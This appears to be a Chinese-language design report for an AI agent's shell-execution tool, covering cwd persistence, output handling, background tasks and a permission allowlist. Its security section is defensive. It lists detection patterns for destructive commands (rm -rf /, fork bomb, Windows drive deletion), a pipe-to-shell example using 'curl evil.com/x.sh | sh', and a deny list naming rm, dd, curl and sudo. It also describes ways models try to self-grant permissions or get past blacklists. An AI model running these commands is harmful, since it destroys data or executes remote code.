# cb-agent BashTool 系统技术报告

> 写于 cb-agent v0.1+，对应 commit `ca74eca` (重做) → `048277e` (file_write 配套)。
> 本文是给"想看懂为什么是这样写"的人准备的，不是 API 文档。
> 同名工具的源代码在 [tools/tools/bash_*.py](../tools/tools/)。

---

## 0. 这份报告解决什么问题

如果你只想"在 agent 里能跑命令"，`subprocess.run(cmd, shell=True)` 一行就够了。但当你的 agent 是一个**长会话、跨多轮、用户在场**的产品，这一行会在很多缝隙里漏问题：

1. 模型说`cd cb-agent`然后下一轮调用`ls`，结果在错误目录里——cwd 不持久。
2. 模型一时兴起调了`rm -rf /`——你没拦截。
3. 模型调了`npm install`，要等 60 秒，整个 REPL 卡住——没法后台。
4. 模型跑了`find / -name *.log`，一次返回 200MB stdout——上下文炸了。
5. 用户说"以后 python 命令都不要再问我"——你没有授权机制。
6. PowerShell 上模型写`ls && cat foo`，PS5 不支持 `&&` 当场失败——你没给提示。
7. 模型在 PS 里跑`echo $env:PATH > out.txt`，再读发现是 UTF-16 BOM 乱码——你没处理编码。

cb-agent 的 BashTool 就是把这 7 个坑（外加十几个边角问题）系统化处理。它不是一个文件，是 9 个模块组成的协同系统。本文把每个决策的**为什么**讲清楚，让你看完能自己复现一份。

参考来源：Claude Code 的 BashTool 实现（外部代码/06-BashTool）。我们做了大量裁剪和适配——cb-agent 是同步 REPL，没有前端弹窗，没有 LSP，没有 fileHistory，所以很多东西是从头设计的。

---

## 1. 顶层设计

### 1.1 模块拓扑

```
                           ┌─────────────────┐
                           │   AgentRunner   │  ← run_agent.py
                           └────────┬────────┘
                                    │ register_tool
                                    ▼
                           ┌─────────────────┐
                           │  ToolRegistry   │
                           └────────┬────────┘
                                    │
                ┌───────────────────┼───────────────────┐
                ▼                   ▼                   ▼
          ┌──────────┐      ┌─────────────┐    ┌──────────────────┐
          │ BashTool │      │ BashTaskTool│    │BashPermissionTool│
          └────┬─────┘      └──────┬──────┘    └─────────┬────────┘
               │                   │                     │
               │  调用以下基础设施    │                     │
               ▼                   ▼                     ▼
    ┌──────────────────────────────────────────────────────┐
    │  bash_security  │ 致命/警告模式 + bashlex 管道解析        │
    │  bash_classify  │ search/read/list/silent 命令分类       │
    │  bash_semantics │ grep/find/diff 退出码语义查表          │
    │  bash_shell     │ PowerShell/Git Bash/cmd 检测+包装      │
    │  bash_session   │ cwd 跨调用持久化（cd marker 注入）       │
    │  bash_output    │ 大输出截断 + 落盘                        │
    │  bash_background│ 后台进程注册 + 完成通知                  │
    │  bash_permission│ allowlist + 同步弹窗                    │
    │  bash_prompt    │ 模型提示词                              │
    └──────────────────────────────────────────────────────┘
```

**给模型看的是 3 个工具**（蓝色框），**底层是 9 个支撑模块**（绿色框）。模型不感知模块边界，只看 `bash` / `bash_task` / `bash_permission` 三个名字。

### 1.2 为什么不是一个文件

BashTool 一开始（commit `edb671e`）确实是一个 580 行的`bash_tool.py`，里面塞着安全检测、shell 检测、分类、退出码——什么都有。结果加后台执行的时候发现：

- 后台任务的注册表是单例，但写在`bash_tool.py`里又被`BashTaskTool`引用，循环依赖。
- 安全检测的正则要被`bash_permission`复用（弹窗时也要看是不是只读命令），但它在`bash_tool.py`里。
- 测试要单独验`check_fatal`，必须`from tools.tools.bash_tool import check_fatal`，跟实际职责不符。

拆分之后的判定规则：**一个模块只负责一个**侧面的决策。`bash_tool.py`变成"协调者"，其他模块都是无副作用的纯函数 + 一个进程级单例（如果需要状态）。这套结构跟 Unix 工具哲学是一致的——`grep`只搜不切，`sort`只排不去重，`uniq`才去重。

### 1.3 三个工具的职责切分

| 工具 | 职责 | 模型在什么时候用 |
|---|---|---|
| `bash` | 执行单条命令（前台或后台） | 99% 的执行场景 |
| `bash_task` | 管理后台任务（list/output/wait/kill） | 配合 `bash(run_in_background=true)` |
| `bash_permission` | 直接读写 allowlist（grant/revoke/list/check） | 用户用自然语言授权时（"以后 X 不要再问我"） |

为什么不把 `bash_permission` 合进 `bash` 的 action？

因为它们的**语义层级不同**。`bash` 是执行命令，会触发权限检查；`bash_permission` 是修改权限规则本身，不应该被 allowlist 拦截（否则就死锁了）。把它独立出来，就能在`bash_permission_tool.py:DENY_PREFIXES`里直接拦截"模型试图给自己授权 rm -rf"这种情况。

---

## 2. 核心设计决策

### 2.1 为什么是同步阻塞 + 全程 stdin 弹窗

Claude Code 是 web/IDE 形态，权限确认走前端弹窗（异步消息）。cb-agent 是 REPL：

```
> 用户输入
  ↓
AgentRunner._chat_once  ← 同步函数
  ↓
ToolRegistry.execute_tool  ← 同步
  ↓
BashTool.run  ← 同步
  ↓
PermissionGate.evaluate
  ↓ 命中 ASK 决策
print("[1] 允许这一次 ...")
input()  ← stdin 阻塞，REPL 整个停在这
```

这个设计有两个结果：

**优点**——零额外基础设施。不需要事件总线、不需要 IPC、不需要 web socket。stdin 就是天然的同步通道。

**代价**——`run_agent.py` 主线程被`input()`阻塞时，**后台任务的完成通知没法主动推**（用户不按回车你就推不出去）。我们的解法是：每轮`_chat_once`开头先调用`drain_notifications()`，把上一轮还没"消费"的完成事件作为`<system-reminder>`塞到 user_query 前面。模型每次 think 都能"看到"哪些后台任务结束了。

这个权衡的关键判断是：**cb-agent 的设计目标是单人开发助手，不是多用户服务**。如果是后者，必须改成异步 + 前端推送。但对单人 REPL，同步阻塞是更便宜也更不容易出 bug 的方案。

### 2.2 为什么 cwd 不用 pexpect

最容易的"持久化 cwd"方案是开一个长 shell 子进程，通过 pexpect 喂命令读输出。这个方案在 Linux 工作得很好，但：

- **Windows pexpect 需要 winpty/pywinpty**，这俩在 venv 里安装失败率不低（VC++ Build Tools）。
- **PowerShell 的 prompt 解析非常脆**——它会插入 ANSI 颜色码、可能改 `$PROMPT` 函数。
- **多进程并发跑测试会复用同一个 shell**，状态泄漏。

我们的方案是**伪持久化**——每次执行命令时把它包装成：

```bash
cd "<上次记的 cwd>" && <用户命令>; printf "\n__CBAGENT_CWD__%s__CBAGENT_CWD_END__" "$(pwd)"
```

PowerShell 版：
```powershell
Set-Location -LiteralPath "<上次记的 cwd>"; <用户命令>; Write-Host "__CBAGENT_CWD__$($PWD.Path)__CBAGENT_CWD_END__"
```

每次都开新进程，但每次都"先回到记忆中的 cwd"。命令结束时 marker 就在 stdout 末尾，正则一抓就拿到新 cwd，写回内存。看 [bash_session.py:110](../tools/tools/bash_session.py#L110) `BashSession.compose`。

这套有个微妙细节，对应 [bash_session.py:61](../tools/tools/bash_session.py#L61) `command_intends_cwd_change`：

> 用户写 `cd a && ls && cd ..`——marker 抓到的是 `..` 之后的目录，写回主 session 是用户预期。
> 用户写 `cd nonexistent; ls`——PowerShell 会因为`;`继续执行，`ls`在原目录跑，marker 落在原目录，"似乎"对的。
> 但用户写 `find . -exec sh -c "cd /tmp && ..." \;`——子 shell 改的 cwd 不应该污染主 session。

所以约定：**只有当用户原始 command 文本里包含显式的 cd/pushd/popd/Set-Location 关键字时才允许写回 cwd**。否则即便 marker 抓到了新值，也只是清理 marker，不更新 self._cwd。这是保守策略——宁可"漏写"也不"误写"。

### 2.3 为什么用 bashlex 而不是 shlex

安全检测的核心是"切出每段 simple command"。比如：

```bash
PATH=/tmp git push --force origin main
```

`shlex.split()` 切出 `["PATH=/tmp", "git", "push", "--force", "origin", "main"]`——但前面的`PATH=/tmp`是环境变量赋值，不是命令名。如果你简单地"取首 token"会得到`PATH=/tmp`，从而漏掉对`git push --force`的警告。

`bashlex` 是真正的 POSIX shell AST 解析器，能识别：
- 环境变量赋值（`assignment` 节点）
- 管道（`pipeline` 节点 → `command` 节点列表）
- 命令替换（`commandsubstitution`）
- 重定向（`redirect`）
- heredoc

我们用它把命令切成一组 argv 列表，每个 argv 都剥掉了赋值前缀。然后对每个 argv 单独跑黑名单正则——见 [bash_security.py:parse_pipeline](../tools/tools/bash_security.py)。

但 bashlex 不支持 PowerShell。所以我们的实现是"先 bashlex，失败 → 降级到 shlex+正则切"。降级的时候会丢失一些精度（环境变量赋值剥不干净），但黑名单是"原始字符串扫描" + "argv 拼回扫描"两层，原始字符串那层依然兜底——对应 [bash_security.py:check_fatal](../tools/tools/bash_security.py) 里的两次 for 循环。

### 2.4 为什么 strict 模式默认开

Claude Code 默认 strict——除了`pwd / ls / cat / git status / docker ps / kubectl get`这种明确只读的命令，**所有其他命令第一次都弹窗**。我们沿用这个默认。

设计争议点是"开发者用起来烦不烦"。每次跑`python xxx.py`都弹一次确实烦。但解决方案是 allowlist 持久化（`[2]` 总是允许在此目录、`[3]` 总是允许在所有目录），而不是降低默认严格度——

理由：**默认严格 + 用户主动放宽** 比 **默认宽松 + 用户被动出事** 安全得多。模型在多轮对话中会做出"看似无害但有副作用"的决策（比如`pip install` 一个错误的包名 typosquatting），strict 默认是最后一道防线。

只读白名单的具体清单在 [bash_permission.py:READ_ONLY_PREFIXES](../tools/tools/bash_permission.py)。多动词命令（git/docker/kubectl/cargo 等）的只读子命令单独列了第二个集合 `READ_ONLY_MULTI_VERB`，匹配规则是先用`extract_prefix`提取出"git push"或"git"两种粒度，再分别查表。

### 2.5 为什么后台任务输出**直接写文件**而不是 PIPE

`subprocess.Popen(stdout=PIPE)`是常见做法，但子进程一旦输出超过几十 KB，PIPE 内核 buffer 就满，**子进程的 write 系统调用会阻塞**。如果父进程不及时 read，子进程就僵住。

要正确处理 PIPE，你得开两个线程持续读 stdout/stderr。这在前台命令里没问题（我们就是这么做的，`communicate()`内部就是双线程），但后台任务父进程不会主动读——只在用户问的时候才查。

所以后台任务的方案是：

```python
# bash_background.py
log_path = output_dir / f"{task_id}.log"
fh = open(log_path, "wb")  # 注意是二进制
proc = subprocess.Popen(
    argv,
    stdout=fh,            # 操作系统直接把 stdout 重定向到文件
    stderr=subprocess.STDOUT,
    cwd=cwd,
    creationflags=...
)
```

操作系统在内核态就把字节流写文件，绕过用户态 buffer，**子进程永远不会因为输出多而阻塞**。代价是文件可能很大（npm install 输出几 MB），但磁盘比内存便宜，而且我们后台任务结束时就标记完成，模型只在需要时才用`bash_task(action=output)`拉尾部 100KB。

完整代码见 [bash_background.py:spawn](../tools/tools/bash_background.py)。

### 2.6 为什么大输出**先落盘再截断**而不是反过来

前台命令的输出处理（[bash_output.py:process_output](../tools/tools/bash_output.py)）有三个阈值：

| 阈值 | 行为 |
|---|---|
| ≤ 100KB stdout / 20KB stderr | 直接返回 |
| > 100KB stdout | 截断到 100KB，加省略提示 |
| > 1MB stdout | **完整原文**写到`./.cbagent/bash_outputs/<task_id>.log`，stdout 字段返回前 100KB + `output_file` 路径 |
| > 64MB stdout | 直接丢弃多余字节（硬上限） |

为什么要区分 "100KB 截断" 和 "1MB 落盘"？

- 100KB 是**给模型的上下文预算**——LLM 单次 tool_result 不该塞超过几万 token。
- 1MB 是**值得保留全文的阈值**——更小的输出截断完就丢了，模型问"完整内容呢"也没办法回答；够大的就该落盘，让模型用 `file_read(path=output_file, tail=N)` 按需拉取。

这个分层让模型有清晰的处理路径：
1. 看到 `output_truncated: true` 就知道有截断
2. 看到 `output_file: "/path/to/log"` 就知道完整版在哪
3. 想看尾部就 `file_read(path=..., tail=200)`，想看头部就 `head=200`

而不是给模型一坨 100MB 让它自己想办法。

### 2.7 为什么 PowerShell 要强制 UTF-8

PowerShell 5（Windows 自带的版本）默认 OutputEncoding 是 cp936（简中）或对应 ANSI。如果不强制 UTF-8：

- `Get-Content 中文.txt` 输出到 stdout → cp936 编码字节 → Python `text=True, encoding="utf-8"` 用 UTF-8 解 → mojibake。
- 模型看到一堆 `锘\xe5\x93...` 之类的——根本读不懂自己的命令产出了什么。

修复在 [bash_shell.py:_ps_wrap](../tools/tools/bash_shell.py)：

```python
prefix = (
    "$OutputEncoding = "
    "[Console]::OutputEncoding = "
    "[System.Text.Encoding]::UTF8; "
)
return prefix + command
```

每次 PowerShell 命令都先注入这一段。`$OutputEncoding`管"PS 把字符串编成什么字节再丢给下游进程"，`[Console]::OutputEncoding`管"PS 怎么解 stdout"。两个都设 UTF-8 才彻底。

类似地 cmd.exe 用 `chcp 65001` 切 UTF-8 代码页（[bash_shell.py:_cmd_wrap](../tools/tools/bash_shell.py)）。Git Bash / WSL 默认就是 UTF-8 不用管。

---

## 3. 安全模型详解

### 3.1 三层防线

```
模型生成 command
       │
       ▼
  ┌────────────┐
  │ check_fatal│ ← 第一层：致命模式，命中直接返回 [拒绝]
  └────┬───────┘
       │未命中
       ▼
  ┌──────────────────┐
  │ check_warnings   │ ← 第二层：警告模式，标 warnings 但不拦
  └────┬─────────────┘
       │
       ▼
  ┌────────────────────┐
  │ PermissionGate     │ ← 第三层：allowlist 匹配
  │  - 只读命令直接 ALLOW│
  │  - 命中 allowlist → ALLOW + matched_rule
  │  - warnings 非空且未授权 → ASK（弹窗）
  │  - 都没命中 + strict 模式 → ASK（弹窗）
  └────┬───────────────┘
       │
       ▼
  执行命令（subprocess.Popen）
```

### 3.2 致命模式选了哪些

完整清单见 [bash_security.py:FATAL_PATTERNS](../tools/tools/bash_security.py)。挑几个有代表性的解释为什么入选：

**`rm -rf /` 系列**——三种变体：
```
\brm\s+-[a-zA-Z]*[rR][a-zA-Z]*f\s+/(?:\s|$)   # rm -rf /
\brm\s+-[a-zA-Z]*[rR][a-zA-Z]*f\s+/\S         # rm -rf /etc
\(\s*rm\s+-[a-zA-Z]*r[a-zA-Z]*f\s+/           # (rm -rf /  子 shell 包裹
```
为什么不用一个简单的`rm -rf /`？因为参数顺序自由（`rm -fr`、`rm -Rf`），中间可能有别的 flag，子 shell 包裹常用于"绕过黑名单"。三条规则覆盖三种攻击面。

**远程脚本管道到 shell**：
```
\b(curl|wget|fetch)\s+\S+.*\|\s*(?:ba|z|k|d|fi)?sh\b
```
经典攻击向量。`curl evil.com/x.sh | sh`——下载脚本直接执行。`bash/zsh/ksh/dash/fish`变体一起匹配。

**Zsh `=cmd` 扩展**：
```
(?:^|[\s;&|])=[a-zA-Z_]
```
Zsh 里 `=ls` 等价于 `$(which ls)`。如果你白名单了`ls`，攻击者可以构造`=l$(echo s)`绕过纯字符串匹配。直接禁这个语法。

**fork 炸弹**：
```
:\(\)\s*\{\s*:\|:&\s*\};:
```
经典的`:(){ :|:& };:`，不解释。

**Windows 盘符根删除**——三条专门的规则覆盖`Remove-Item C:\`、`rd /s /q C:\`、`Format-Volume`等。Windows 上模型偶尔会"忘记自己在 Windows"写出 PowerShell 风格的破坏命令，得专门处理。

### 3.3 警告模式 vs 致命模式的边界

为什么`git push --force`是 warning 不是 fatal？

因为它**有合法用途**——rebase 后推送到自己的分支是常规操作。判断"是不是 OK"需要上下文（这是个人分支还是 main？仓库设置允许 force 吗？）。所以策略是：

- **fatal**：无论上下文都不该执行（`rm -rf /`、`mkfs`、`curl | sh`）
- **warning**：上下文敏感，但默认应该问一下用户（`git push --force`、`TRUNCATE TABLE`、`DROP DATABASE`）

warning 命中后，[bash_permission.py:evaluate](../tools/tools/bash_permission.py) 会强制走 ASK 路径——即使命令在 read-only 白名单里也不放过：

```python
if warnings and not is_read_only:
    return self._ask(prefix, cwd)   # 弹窗
```

关键代码在 PermissionGate.evaluate 末尾——warnings 优先级高于 read-only 白名单。

### 3.4 allowlist 的存储格式

```json
// .cbagent/permissions.json
{
  "rules": [
    {"prefix": "python", "scope": "cwd", "cwd": "/c/Users/cb135/Desktop/cbAgent/cb-agent", "added_at": "2025-..."},
    {"prefix": "git push", "scope": "global", "cwd": "", "added_at": "..."}
  ],
  "version": 1
}
```

**scope 有三档**：
- `cwd`：仅在指定目录及其子目录下生效（项目级授权）
- `global`：任意目录都生效（开发者偏好的常用命令）
- `session`：仅本进程内有效，不写盘（一次会话内的临时放行，进程退出即失效）

`cwd` 匹配用 `pathlib.PurePath.is_relative_to` 做前缀判断——所以授权了`/foo/bar`就在`/foo/bar/baz`也命中，而不是只在精确路径下命中。这符合"在这个项目里"的直觉。

**为什么 grant 不允许写入 fatal/dangerous 命令**：

[bash_permission_tool.py:DENY_PREFIXES](../tools/tools/bash_permission_tool.py)：
```python
DENY_PREFIXES = {
    "rm", "del", "erase", "rd", "rmdir",
    "remove-item", "ri",
    "format-volume", "clear-disk",
    "mkfs", "dd",
    "iex", "invoke-expression",
    "curl", "wget",
    "sudo", "su",
}
```

防止模型被诱导给自己开后门。用户说"以后`rm`命令不要再问我"，工具会拒绝写入并提示"请走弹窗手动确认"。`rm`仍然可以执行——但每次都弹窗，模型没法用工具把它变成"无声放行"。

---

## 4. 后台执行与完成通知

### 4.1 启动流程

```python
# bash_tool.py 主流程
if run_in_background:
    task = registry.spawn(
        task_id=uuid.uuid4().hex[:12],
        command=command,
        argv=shell + [wrapped_command],  # 已经过 wrap_command
        cwd=session.cwd,
    )
    return json.dumps({
        "background": True,
        "background_task_id": task.id,
        "output_file": task.output_path,
        ...
    })
```

`registry.spawn` 在 [bash_background.py:spawn](../tools/tools/bash_background.py)：

```python
def spawn(self, task_id, command, argv, cwd):
    output_path = self._output_dir / f"{task_id}.log"
    fh = open(output_path, "wb")
    creationflags = subprocess.CREATE_NEW_PROCESS_GROUP if os.name == "nt" else 0
    proc = subprocess.Popen(
        argv,
        stdout=fh, stderr=subprocess.STDOUT,
        cwd=cwd, creationflags=creationflags,
    )
    task = BackgroundTask(id=task_id, command=command, popen=proc, ...)
    self._tasks[task_id] = task
    return task
```

`CREATE_NEW_PROCESS_GROUP` 是 Windows 必须的——不加这个 flag，后续`os.kill(pid, signal.CTRL_BREAK_EVENT)`会同时杀掉父进程（你的 cb-agent REPL）。POSIX 上对应的是`os.setpgid` + `killpg`。

### 4.2 完成通知

`AgentRunner._chat_once` 每轮开头：

```python
def _chat_once(self, user_query: str):
    # bash 后台完成通知前置
    user_query = self._prepend_background_notifications(user_query)
    ...

def _prepend_background_notifications(self, user_query):
    done = get_background_registry().drain_notifications()
    if not done:
        return user_query
    lines = ["<system-reminder>", "[后台任务完成通知]"]
    for t in done:
        lines.append(f"- task_id={t.id} status={t.status} ...")
    lines.append("请主动用 bash_task(action=output, task_id=...) 拉结果。")
    lines.append("</system-reminder>")
    return "\n".join(lines) + "\n\n" + user_query
```

`drain_notifications()` 的语义：返回**自上次调用后新完成且未被读过**的任务，并把它们标记为已通知。这是消费一次的设计——避免重复打扰模型。

代码在 [bash_background.py:drain_notifications](../tools/tools/bash_background.py)：

```python
def drain_notifications(self):
    out = []
    for t in self._tasks.values():
        self._refresh(t)  # poll 一下进程状态
        if t.status != "running" and not t.notified:
            t.notified = True
            out.append(t)
    return out
```

`_refresh` 用`popen.poll()`非阻塞查询退出码，没结束就返回 None。这避免了"显式 wait 才能更新状态"的问题——任何时候问 list/output 都能看到最新状态。

### 4.3 跨平台杀进程

`bash_task(action=kill)` 的实现：

```python
# bash_background.py
def kill(self, task_id):
    t = self._tasks.get(task_id)
    if os.name == "nt":
        try:
            os.kill(t.popen.pid, signal.CTRL_BREAK_EVENT)
            time.sleep(2)
            if t.popen.poll() is None:
                subprocess.run(["taskkill", "/T", "/F", "/PID", str(t.popen.pid)])
        except OSError:
            pass
    else:
        try:
            os.killpg(os.getpgid(t.popen.pid), signal.SIGTERM)
            time.sleep(2)
            if t.popen.poll() is None:
                os.killpg(os.getpgid(t.popen.pid), signal.SIGKILL)
        except OSError:
            pass
```

Windows 用 `CTRL_BREAK_EVENT` 软关 → 2s 等不到就 `taskkill /T /F`（带子树）。POSIX 用 `SIGTERM` → 2s → `SIGKILL`。两边都做了"温和 → 强制"两步——给程序保存状态的机会，但不无限等。

---

## 5. 模型如何用这套系统

### 5.1 提示词注入

[bash_prompt.py:BASH_SYSTEM_PROMPT](../tools/tools/bash_prompt.py) 这一大段会拼到系统消息里。关键约定：

1. **平台提示**——动态注入。PS5 上专门告诉模型"禁止用`&&`"和具体替代写法。
2. **何时使用专用工具而不是 bash**——todo / search / memory 优先于 bash。
3. **多命令策略**——独立命令并行调多次 bash，依赖命令用`&&`串起来。
4. **弹窗机制说明**——告诉模型"会弹窗是预期不是 bug"，避免它误判失败。
5. **如何确认 allowlist 真的写入了**——读返回 JSON 里的`permission.matched_rule`字段。
6. **后台执行用法**——`run_in_background=true` + `bash_task` 的四种 action。
7. **大输出处理协议**——不要自己重定向，看`output_file`。

### 5.2 典型对话流

**场景 1：第一次跑 python**

```
用户: 跑一下这个 python 脚本
模型: [bash command="python script.py"]
[弹窗]
  ⚠️  即将执行: python script.py
  目录: /c/Users/cb135/...
  - [1] 允许这一次
  - [2] 总是允许 "python" 在此目录
  - [3] 总是允许 "python" 在所有目录
  - [4] 拒绝
用户输入: 2
模型收到: {
  "stdout": "...",
  "permission": {
    "decision": "allow",
    "reason": "已加入项目级 allowlist",
    "matched_rule": {"prefix": "python", "scope": "cwd", ...}
  }
}
模型: 已运行，结果如上。已记住此目录下的 python 命令免确认。
```

**场景 2：用户自然语言授权**

```
用户: 以后这个项目里 npm install 都不要再问我
模型: [bash_permission action="grant" prefix="npm install" scope="cwd"]
返回: {"ok": true, "rule": {...}, "message": "已授权 'npm install' 在当前目录..."}
模型: 好，已授权当前项目下 npm install 不再确认。
```

**场景 3：长时间任务**

```
模型: [bash command="npm install" run_in_background=true]
返回: {"background": true, "background_task_id": "a1b2c3", "output_file": "..."}
模型: 已后台执行，task_id=a1b2c3，约 60 秒后会自动通知。

[60 秒后用户继续聊]
用户: 进度怎么样了
模型收到的 user_query 前面有 system-reminder:
  [后台任务完成通知]
  - task_id=a1b2c3 status=done exit=0 cmd='npm install' output=...
模型: [bash_task action="output" task_id="a1b2c3"]
返回: {"task": {...}, "output": "...", "output_truncated": true}
模型: 安装完成，最后输出如上。需要看完整日志可以告诉我。
```

### 5.3 模型常见错误模式与拦截

我们在调试中观察到一些 LLM 的"幻觉" behavior：

| 错误模式 | 拦截手段 |
|---|---|
| 模型跑完命令后凭空说"已加入 allowlist" | 提示词强制要求看`matched_rule`字段；`matched_rule==null`+`reason="本次允许"`时不能宣称"已加入" |
| 模型在 PS5 写 `cmd1 && cmd2` 失败后试图`echo $? -eq 0` | platform_hint 明确禁止`&&`+给三种替代写法 |
| 模型自己重定向输出到文件再读 | prompt 里专门提了"不要 `>` 或 `Out-File`，让 bash 自动落盘" |
| 模型对 grep 退出码 1 反复重试 | bash_semantics 把"未匹配"标成`status=ok`返回给模型 |
| 模型试图给自己 grant rm | DENY_PREFIXES 拦截 |
| 模型跑完 `cd foo && ls` 但没"记住"当前在 foo | session.cwd 自动持久化，下次直接跑命令就在 foo 里 |

---

## 6. 数据流详解：一次命令的完整生命周期

以 `bash(command="python -c 'print(1)'")` 为例，假设这是当前目录第一次跑 python（未授权）。

```
1. AgentRunner._chat_once 收到模型的 tool_call
       │ tool_call_args = {"command": "python -c 'print(1)'"}
       ▼
2. ToolRegistry.execute_tool("bash", args)
       │
       ▼
3. BashTool.run(args)
       │
       ├─→ validate_parameters: command 非空、timeout 合法
       │
       ├─→ check_fatal("python -c 'print(1)'") → None
       │
       ├─→ check_warnings("python -c 'print(1)'") → []
       │
       ├─→ parse_pipeline → [["python", "-c", "print(1)"]]
       │
       ├─→ extract_prefix(["python", "-c", "print(1)"]) → "python"
       │     (python 是多动词命令，但 -c 是 flag 不是子命令，所以只取 "python")
       │
       ├─→ PermissionGate.evaluate(prefix="python", warnings=[], cwd="/.../cb-agent")
       │     │
       │     ├─→ store.is_allowed("python", "/.../cb-agent") → None
       │     │
       │     ├─→ extract_prefix in READ_ONLY_PREFIXES? "python" 不在 → False
       │     │
       │     ├─→ strict + 未只读 + 未授权 → 弹窗
       │     │
       │     ├─→ print 弹窗 + input()
       │     │     用户输入 "2"
       │     │
       │     └─→ store.add_rule("python", scope="cwd", cwd="/.../cb-agent")
       │           写入 .cbagent/permissions.json
       │           返回 GateResult(decision=ALLOW, matched_rule=Rule(...))
       │
       ├─→ BashSession.compose("python -c 'print(1)'")
       │     → 'cd "/.../cb-agent" && python -c \'print(1)\'; __rc=$?; printf "\n__CBAGENT_CWD__%s__CBAGENT_CWD_END__" "$(pwd)"; exit $__rc'
       │
       ├─→ get_shell() → ["powershell.exe", "-NoProfile", "-Command"]
       │
       ├─→ wrap_command(...) → 在前面拼 "$OutputEncoding = ...; "
       │
       ├─→ subprocess.Popen(shell + [wrapped], stdout=PIPE, stderr=PIPE)
       │     proc.communicate(timeout=120000)
       │     stdout = "1\n__CBAGENT_CWD__C:\\...\\cb-agent__CBAGENT_CWD_END__\n"
       │     stderr = ""
       │     exit_code = 0
       │
       ├─→ session.consume_cwd_marker(stdout, original_command="python -c 'print(1)'")
       │     - 抓到 marker，cleaned_stdout = "1\n"
       │     - command_intends_cwd_change("python -c 'print(1)'") → False
       │       (没有 cd 关键字)
       │     - allow_writeback = False，**不写回 self._cwd**
       │     - 返回 (cleaned, None)
       │
       ├─→ process_output(cleaned, "", output_dir, task_id)
       │     - 5 字节远小于 100KB → 直接返回不截断不落盘
       │
       ├─→ lookup_semantic("python", 0) → None
       │     (python 没有特殊退出码语义)
       │
       └─→ return json.dumps({
              "stdout": "1",
              "stderr": "",
              "exit_code": 0,
              "cwd": "/c/Users/cb135/.../cb-agent",
              "interrupted": false,
              "timeout": false,
              "is_error": false,
              "background": false,
              "classification": {"kind": "normal"},
              "warnings": [],
              "permission": {
                "decision": "allow",
                "reason": "已加入项目级 allowlist",
                "matched_rule": {"prefix": "python", "scope": "cwd", ...},
                "permission_unavailable": false
              }
            })
       │
       ▼
4. 模型看到结果，对用户回复："运行成功，输出 1。"
```

---

## 7. 测试策略

[test_bash_tool.py](../test/test_bash_tool.py) 64 个测试覆盖 9 个模块，分类：

| 测试类 | 覆盖什么 | 关键决策 |
|---|---|---|
| `TestSecurity` | fatal/warning 模式、bashlex 解析、引号保护 | 用真实危险字符串测，不 mock |
| `TestClassify` | search/read/list/silent/normal 分类 | 重点测复合命令首 token |
| `TestSemantics` | grep/find/diff 退出码语义 | 验"非零=ok"的特殊情况 |
| `TestSession` | cwd 持久化、marker 抓取、子 agent 隔离 | `command_intends_cwd_change` 的所有边界 |
| `TestOutput` | 内存截断、落盘门槛 | mock 一个 50MB 字符串测 64MB 硬上限 |
| `TestPermission` | strict/非 strict、allowlist 命中、persistence | 用临时目录 PermissionStore 避免污染主配置 |
| `TestBackground` | spawn/wait/kill、跨平台进程组 | 用 `python -c "import time; time.sleep(...)"` 做 fixture |
| `TestBashPermissionTool` | grant/revoke/list/check + 高危拦截 | 验 DENY_PREFIXES 能拦住所有高危项 |
| `TestBashToolEndToEnd` | 真实 Popen，完整流程 | 包含 fatal 拦截、cd 持久、permission 字段确认 |
| `TestFileRead` | head/tail/range、不存在路径 | 配合 file_state.ReadStateRegistry |
| `TestFileWrite` | 创建/staleness/UNC/原子 | mock fsync 测原子回滚 |

跑法：
```bash
cd cb-agent
../venv/Scripts/python.exe test/test_bash_tool.py
```

---

## 8. 跟 Claude Code 的取舍对比

| 项 | Claude Code | cb-agent | 为什么不一样 |
|---|---|---|---|
| 权限确认 | 前端弹窗（异步消息） | stdin 同步弹窗 | 没有 web 前端 |
| 后台任务通知 | tool_use_event 主动推 | 每轮 think 前 drain | REPL 阻塞架构 |
| cwd 持久化 | shell session via pty | cd marker 注入 | 跨平台 + 无依赖 |
| 文件历史/回滚 | fileHistoryEnabled 全套 | 无 | 主要场景非 IDE |
| LSP 联动 | 写文件后通知 LSP | 无 | 没集成 LSP |
| diff 显示 | 完整 patch 渲染 | 仅行数计数 | 终端显示有限 |
| 团队 secret 检查 | checkTeamMemSecrets | 无 | 单机使用 |
| skill 自动发现 | 写文件后扫 SKILLS | 已有独立 skills/ | 架构不同 |
| 弹窗选项 | 4 选 | 4 选 | 一致 |
| allowlist 持久化 | 4 档 (session/cwd/global/...) | 3 档 (session/cwd/global) | 简化 |
| 危险命令黑名单 | 几十条 | 我们的 30+ 条 | 大量复用 |

**整体方向**：Claude Code 是企业级 IDE 助手，cb-agent 是单人 REPL 助手。我们保留了"安全模型 + 弹窗机制 + 后台执行 + 大输出处理"这四个核心，砍掉了"团队协作 + IDE 集成 + 历史回滚"这三个 cb-agent 用不上的。

---

## 9. 已知限制与未来方向

### 9.1 已知限制

1. **不支持 stdin 输入流**：cb-agent REPL 阻塞架构没法在命令运行中喂 stdin。需要交互的命令（`python -i`、`mysql`）跑不了。后台模式启动后也没法发送输入。
2. **bashlex 不支持 PowerShell**：PS 命令的 argv 切分降级到 shlex+正则，环境变量赋值剥不干净。但黑名单是双层扫描，影响有限。
3. **单进程单 session**：所有 tool 调用共享一个全局 BashSession。多线程并发 tool（理论上 ToolRegistry 支持）会有 cwd 竞态。目前 AgentRunner 是串行调度，未触发。
4. **allowlist 不区分用户**：`.cbagent/permissions.json`是项目级文件，多用户共享同一项目目录会互相影响。这个目录通常是开发机的本地仓库，单用户场景不是问题。
5. **大输出 64MB 是收完才截断**：`subprocess.communicate()`先把全部 stdout 读进内存再判断大小。对于真的 10GB 输出，会爆内存。理论修复要换成流式 read+大小累加判断，工程量大，目前不做。

### 9.2 没做但值得做的

- **cwd marker 引号转义**：现在`cd "<cwd>"` 把 cwd 直接拼进双引号，cwd 含双引号会失败。Windows 路径不允许双引号，POSIX 上罕见，影响小。
- **危险命令的"建议替代"**：现在拒绝 `rm -rf /` 只说"被拒"。可以同时给出"你是不是想清空当前项目？用 git clean -fd"这样的建议。
- **PowerShell 7 检测**：`pwsh.exe` vs `powershell.exe`。当前两个都识别但不区分。PS7 支持`&&`，platform_hint 应该针对 7 放宽提示。
- **后台任务的资源限制**：现在没限制并发数，模型可以一口气起 50 个`npm install`。需要 `MAX_CONCURRENT_BACKGROUND` 默认 5，超了就拒。

### 9.3 不会做的

- **不会加 sandbox/容器隔离**。cb-agent 是开发工具，模型跑你授权的命令本来就是预期。要沙箱去用 Docker/Firejail 包整个 agent 进程。
